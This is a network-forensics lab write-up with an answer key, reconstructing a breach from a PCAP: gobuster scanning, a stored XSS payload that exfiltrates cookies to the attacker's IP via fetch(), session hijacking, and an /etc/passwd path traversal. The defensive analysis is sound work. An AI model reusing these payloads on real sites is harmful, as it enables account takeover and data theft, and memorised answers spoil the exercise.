# Scenario & Objective

In recent days, ShopSphere, a prominent online retail platform, has experienced unusual administrative login activity during late-night hours. These logins coincide with an influx of customer complaints about unexplained account anomalies, raising concerns about a potential security breach. Initial observations suggest unauthorized access to administrative accounts, potentially indicating deeper system compromise.

Your mission is to investigate the captured network traffic to determine the nature and source of the breach. Identifying how the attackers infiltrated the system and pinpointing their methods will be critical to understanding the attack's scope and mitigating its impact.

- **Category**: Network Forensics
- **Tools**: Wireshark

## Overview

On March 29, 2024, a web application hosted at `73.124.17.52` (running Apache/2.4.52 on Ubuntu) suffered a security breach resulting in session hijacking and data exfiltration. At `11:52`, an initial unauthorized request originated from IP `135.143.142.5` attempting to access the admin panel using default credentials (`admin:password123`), which failed. At `12:01`, the attacker operating from IP `111.224.180.128` performed directory brute-forcing using `gobuster/3.6` to discover hidden paths and endpoints.

Between `12:01` and `12:08`, the attacker injected a Stored Cross-Site Scripting (XSS) payload (`<script>fetch('http://111.224.180.128/' + document.cookie);</script>`) into `/reviews.php`. At `12:09`, an administrative user visiting from IP `135.143.142.5` accessed `/reviews.php`, triggering the script and exfiltrating their session token (`PHPSESSID=lqkctf24s9h9lg67teu8uevn3q`) to the attacker. Using this stolen token, the attacker hijacked the admin session to log into the system. Between `12:11` and `12:12`, the attacker accessed `log_viewer.php` and executed a Path Traversal attack using `../../../../../etc/passwd` to view sensitive system files before network recording ended at `12:31:05`.

# Analysis

The PCAP file contains 14696 packets from `11:50:11` to `12:31:05` in `2024-03-29`. The file contains multiple IP addresses and have SHA256 value `d46a2b14de413b6bf1ac95151f741038a2f4b07951463ce3c77e7ab0da35ce36`.

First at about `11:52`, the IP `135.143.142.5` try to access admin page of server `73.124.17.52` (The server run `Apache/2.4.52 (Ubuntu)`). Then he try to accessed system using `admin:password123` credentials but it didn't work.
<p align="center">
  <img src="./Assets/Image 1 - Suspicious activities.png" alt="Suspicious activities" /> <br />
  <em>Image 1: Suspicious activities</em>
</p>

After that, at `12:01`, another suspicious IP `111.224.180.128` using `gobuster/3.6` tool to find hidden assets of server. 
<p align="center">
  <img src="./Assets/Image 2 - Scan hidden assets.png" alt="Scan hidden assets" /> <br />
  <em>Image 2: Scan hidden assets</em>
</p>

After that, the attacker use XSS payload into `/reviews.php` page to steal the cookies in the server.
<p align="center">
  <img src="./Assets/Image 3 - Inject XSS payload.png" alt="Inject XSS payload" /> <br />
  <em>Image 3: Inject XSS payload</em>
</p>
```payload
<script>fetch('http://111.224.180.128/' + document.cookie);</script>
```

After that, at about `12:09`, the IP `135.143.142.5` access the `/reviews.php` page, which is injected payload before. So the attacker can get the cookie `PHPSESSID=lqkctf24s9h9lg67teu8uevn3q` of this IP.  
<p align="center">
  <img src="./Assets/Image 4 - Steal session cookie.png" alt="Steal session cookie" /> <br />
  <em>Image 4: Steal session cookie</em>
</p>

Then the attacker use this cookie to access the system.
<p align="center">
  <img src="./Assets/Image 5 - Unauthorized access.png" alt="Unauthorized access" /> <br />
  <em>Image 5: Unauthorized access</em>
</p>

Then at about `12:11` - `12:12` he view the `log_viewer.php` to get more information. Especially the packet no 10220, the attacker use unusual URL `../../../../../etc/passwd`.
<p align="center">
  <img src="./Assets/Image 6 - Attacker steal information.png" alt="Attacker steal information" /> <br />
  <em>Image 6: Attacker steal sensitive information</em>
</p>

# Answer the Questions

**Q1: Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?**

It is `111.224.180.128`.

**Q2: The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?**

It is `gobuster`.

**Q3: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?**

The payload is `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`.

**Q4: Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?**

The timestamp is `2024-03-29 12:09`.

**Q5: The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?**

The session token is `lqkctf24s9h9lg67teu8uevn3q`.

**Q6: Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?**

The name of the script is `log_viewer.php`.

**Q7: Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?**

It is `../../../../../etc/passwd`.